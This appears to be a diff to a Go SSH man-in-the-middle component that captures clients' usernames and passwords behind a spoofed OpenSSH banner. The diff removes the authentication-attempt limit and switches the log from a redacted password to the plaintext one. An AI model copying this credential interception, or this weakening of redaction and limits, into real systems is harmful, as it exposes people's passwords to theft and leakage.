@@ -48,7 +48,6 @@ type SSHMITMConfig struct {
 	MaxPayloadSize      int64
 	SSHInputBufSize     int
 	SSHOutputBufSize    int
-	MaxAuthAttempts     int
 	ServerConfig        *ssh.ServerConfig
 	OnEvent             func(event *kafka.Event)
 	FlowID              string
@@ -434,31 +433,15 @@ func HandleSSH(clientConn net.Conn, config SSHMITMConfig, logger func(string, ..
 		ServerVersion: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
 	}
 
-	maxAttempts := config.MaxAuthAttempts
-	if maxAttempts <= 0 {
-		maxAttempts = 5
-	}
-
 	var authMu sync.Mutex
 	var authSuccess bool
 	var capturedUser, capturedPass string
-	var authAttempts int
 
 	serverConfig.PasswordCallback = func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
-		authMu.Lock()
-		authAttempts++
-		attempts := authAttempts
-		authMu.Unlock()
-
-		if attempts > maxAttempts {
-			logger("SSH MITM: limite de tentativas atingido (%d/%d), rejeitando", attempts, maxAttempts)
-			return nil, fmt.Errorf("permission denied")
-		}
-
 		user := conn.User()
 		pass := string(password)
 
-		logger("🔐 CREDENCIAIS CAPTURADAS - Usuário: %s, Senha: [REDACTED] (tentativa %d/%d)", user, attempts, maxAttempts)
+		logger("🔐 CREDENCIAIS CAPTURADAS - Usuário: %s, Senha: %s", user, pass)
 
 		if config.OnEvent != nil {
 			config.OnEvent(&kafka.Event{
